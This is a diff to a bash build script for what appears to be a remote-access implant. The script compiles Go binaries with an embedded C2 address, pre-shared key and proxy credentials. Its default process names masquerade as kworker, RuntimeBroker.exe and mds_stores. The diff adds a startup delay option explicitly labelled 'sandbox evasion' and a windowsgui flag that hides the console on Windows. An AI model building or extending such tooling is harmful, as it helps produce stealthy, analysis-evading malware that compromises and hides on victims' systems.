@@ -60,6 +60,7 @@ usage() {
     echo -e "  ${BLUE}--proxy ADDR${RESET}       HTTP proxy address"
     echo -e "  ${BLUE}--proxy-user USER${RESET}  Proxy username"
     echo -e "  ${BLUE}--proxy-pass PASS${RESET}  Proxy password"
+    echo -e "  ${BLUE}--delay N${RESET}          Startup delay in seconds (sandbox evasion) ${DIM}[0]${RESET}"
     echo -e "  ${BLUE}--os OS${RESET}            Target OS: linux/windows/darwin ${DIM}[linux]${RESET}"
     echo -e "  ${BLUE}--arch ARCH${RESET}        Target arch: amd64/arm64 ${DIM}[amd64]${RESET}"
     echo -e "  ${BLUE}--all${RESET}              Build for all platforms"
@@ -113,7 +114,7 @@ build_one() {
     local procname excludes
     case "$os" in
         linux)   procname="${OPT_PROCNAME:-[kworker/0:2]}"; excludes="${OPT_EXCLUDES:-/proc,/sys,/dev}" ;;
-        windows) procname="${OPT_PROCNAME:-svchost.exe}";    excludes="${OPT_EXCLUDES:-C:\\Windows\\Temp}" ;;
+        windows) procname="${OPT_PROCNAME:-RuntimeBroker.exe}"; excludes="${OPT_EXCLUDES:-C:\\Windows\\Temp}" ;;
         darwin)  procname="${OPT_PROCNAME:-mds_stores}";     excludes="${OPT_EXCLUDES:-/System}" ;;
         *)       error "Unknown OS: $os" ;;
     esac
@@ -125,8 +126,12 @@ build_one() {
 
     # Build ldflags
     local ldflags="-s -w -buildid="
+    [[ "$os" == "windows" ]] && ldflags+=" -H windowsgui"
     ldflags+=" -X main.cfgMode=${MODE}"
     ldflags+=" -X main.cfgAddress=${ADDR}"
+    # NOTE: The PSK is embedded via -ldflags which appears in /proc/*/cmdline
+    # on Linux. This is acceptable for build-time secrets (short-lived process)
+    # but operators should be aware of the visibility window.
     ldflags+=" -X main.cfgPSK=${PSK}"
     ldflags+=" -X main.cfgFingerprint="
     ldflags+=" -X main.cfgSNI=${SNI}"
@@ -140,6 +145,7 @@ build_one() {
     ldflags+=" -X main.cfgProxyAddr=${OPT_PROXY:-}"
     ldflags+=" -X main.cfgProxyUser=${OPT_PROXY_USER:-}"
     ldflags+=" -X main.cfgProxyPass=${OPT_PROXY_PASS:-}"
+    ldflags+=" -X main.cfgDelay=${OPT_DELAY:-0}"
     ldflags+=" -X main.cfgVersion=$(git describe --tags --always --dirty 2>/dev/null || echo dev)"
     ldflags+=" -X main.cfgBuildCommit=$(git rev-parse --short HEAD 2>/dev/null || echo unknown)"
 
@@ -223,6 +229,7 @@ OPT_RATE_BURST=""
 OPT_PROXY=""
 OPT_PROXY_USER=""
 OPT_PROXY_PASS=""
+OPT_DELAY="0"
 OPT_OS="linux"
 OPT_ARCH="amd64"
 OPT_ALL=0
@@ -244,6 +251,7 @@ while [[ $# -gt 0 ]]; do
         --proxy)       OPT_PROXY="$2";      shift 2 ;;
         --proxy-user)  OPT_PROXY_USER="$2"; shift 2 ;;
         --proxy-pass)  OPT_PROXY_PASS="$2"; shift 2 ;;
+        --delay)       OPT_DELAY="$2"; [[ "$OPT_DELAY" =~ ^[0-9]+$ ]] || error "--delay must be a non-negative integer"; (( OPT_DELAY > 3600 )) && error "--delay max is 3600 (1 hour)"; shift 2 ;;
         --os)          OPT_OS="$2";         shift 2 ;;
         --arch)        OPT_ARCH="$2";       shift 2 ;;
         --all)         OPT_ALL=1;           shift ;;
